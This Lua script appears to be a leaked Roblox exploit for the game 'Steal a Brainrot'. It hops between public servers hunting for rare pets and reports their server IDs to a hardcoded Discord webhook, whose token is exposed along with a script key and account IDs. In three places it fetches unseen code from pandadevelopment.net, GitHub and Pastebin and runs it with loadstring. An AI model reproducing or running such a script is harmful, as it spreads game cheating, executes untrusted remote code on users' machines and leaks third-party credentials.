setfpscap(15)
--// === Configs base e helpers ===
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local allowedPlaceIds = {
    [96342491571673] = false,
    [109983668079237] = true,
}

getgenv().TargetPetNames = {
    "Graipuss Medussi",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Pot Hotspot",
    "Nuclearo Dinossauro",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Los Hotspotsitos"
}

getgenv().webhook = "https://discord.com/api/webhooks/1406707630143049750/XP2JF3fmgo8yYR4QyMdfW7lWCfI-mbDNDW7oSxDDqFP1u7arjkBzydNAjbHsFkzPPdl3"

local function isPrivateServer()
    return (game.PrivateServerId and game.PrivateServerId ~= "")
        or (game.VIPServerId and game.VIPServerId ~= "")
end

local function serverHop()
    local cursor, tries, picked = nil, 0, nil
    repeat
        local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s")
            :format(game.PlaceId, cursor and ("&cursor="..cursor) or "")
        local ok, resp = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if ok and resp and resp.data then
            for _, s in ipairs(resp.data) do
                if s.playing < s.maxPlayers and s.id ~= game.JobId then
                    picked = s.id
                    break
                end
            end
            cursor = resp.nextPageCursor
        else
            break
        end
        tries += 1
    until picked or not cursor or tries > 6

    if picked then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, picked, LocalPlayer)
    else
        warn("❌ No available servers to hop")
    end
end

local function validatePlace()
    if isPrivateServer() then
        serverHop()
        -- LocalPlayer:Kick("Kicked because in private server")
        return false
    end
    local flag = allowedPlaceIds[game.PlaceId]
    if flag == nil or flag == false then
        serverHop()
        -- LocalPlayer:Kick("Kicked because wrong game")
        return false
    end
    return true
end

local currentRebirth = 0
local function readRebirthOnce(player)
    local stats = player:FindFirstChild("leaderstats") or player:WaitForChild("leaderstats", 5)
    if not stats then return nil end
    local r = stats:FindFirstChild("Rebirths") or stats:WaitForChild("Rebirths", 5)
    return r and r.Value or nil
end

local function wireRebirthListener(player)
    local stats = player:FindFirstChild("leaderstats") or player:WaitForChild("leaderstats", 10)
    if not stats then return end
    local r = stats:FindFirstChild("Rebirths") or stats:WaitForChild("Rebirths", 10)
    if not r then return end
    currentRebirth = r.Value
    r:GetPropertyChangedSignal("Value"):Connect(function()
        currentRebirth = r.Value
    end)
end

do
    local v = readRebirthOnce(LocalPlayer)
    currentRebirth = v or 0
    wireRebirthListener(LocalPlayer)
end

local function safeSendWebhook(jsonTable)
    if type(getgenv().webhook) ~= "string" or #getgenv().webhook == 0 then
        return
    end
    local req = http_request or request or (syn and syn.request)
    if not req then
        warn("❌ No HTTP request function available")
        return
    end
    local ok, err = pcall(function()
        req({
            Url = getgenv().webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(jsonTable)
        })
    end)
    if not ok then
        warn("❌ Webhook failed:", err)
    end
end

local function checkForPets()
    local found = {}
    local root = workspace
    for _, obj in ipairs(root:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in ipairs(getgenv().TargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

local function sendFoundPets(petsFound)
    local petCounts = {}
    for _, pet in ipairs(petsFound) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end
    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local embedData = {
        embeds = {{
            title = "🐾 Brainrot(s) Found!",
            description = "**Brainrot(s):**\n" .. table.concat(formattedPets, "\n"),
            color = 65280,
            fields = {
                { name = "Players", value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers), inline = true },
                { name = "Job ID", value = game.JobId, inline = true },
            },
            footer = { text = "Leaked by collin gng" },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    safeSendWebhook(embedData)
end

local function hopFarm()
    if not validatePlace() then return end

    task.spawn(function()
        while true do
            local petsFound = checkForPets()
            if #petsFound > 0 then
                print("✅ Pets found:", table.concat(petsFound, ", "))
                sendFoundPets(petsFound)
            else
                print("🔍 No pets found, hopping server...")
                serverHop()
            end
            task.wait(15)
        end
    end)
end

script_key = "gijxApnnfPULbojMkoZSgIpcYOPSzspo"
getgenv().Settings = {
    Rarity = { "Common", "Rare", "Epic", "Legendary", "Mythic", "Brainrot God", "Secret" },
    RebirthCap = 1,
    AutoRebirth = true,
    AutoLock = true,
    AutoBuy = true,
    AutoSell = true,
    ShutdownOnPublicServer = false,
    AutoShutdownGameOnHop = false,
    AutoBuyRebirthRequirements = true,
    LockPriority = true,
    CollectInterval = 30,
    ProtectRarityFromBeingSellAndRebirth = { "Secret" },
    Webhook = {
        Enabled = false,
        WebhookURL = "",
        WebhookSettings = { TrackMode = "Edit", Interval = 600 },
        BuyNotificationSettings = { Enabled = false, URL = "", PingEveryone = true, Rarity = { "Secret" } }
    }
}

if currentRebirth == 0 then
    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/5dd48a39d1b021b6"))()

    task.spawn(function()
        while true do
            task.wait(300)
            local v = readRebirthOnce(LocalPlayer)
            if v ~= nil then
                currentRebirth = v
            end

            if currentRebirth >= 1 then
                print("[Rebirth>=1] Detectado. Fazendo server hop...")
                if validatePlace() then
                    serverHop()
                end
            else
                print("[Rebirth==0] Ainda sem rebirth. Continuando...")
            end
        end
    end)
else
    print("[Rebirth>=1] Já tem rebirth. Iniciando hopFarm()...")
    hopFarm()
end

_G.Config = { UserID = "bbcc5890-fa5d-4d7f-96d3-0c225b3f04a8", discord_id = "1095855945386578071" , Note = "SAB", }
loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/sab"))()
loadstring(game:HttpGet("https://pastebin.com/raw/xJrz3dpf"))()
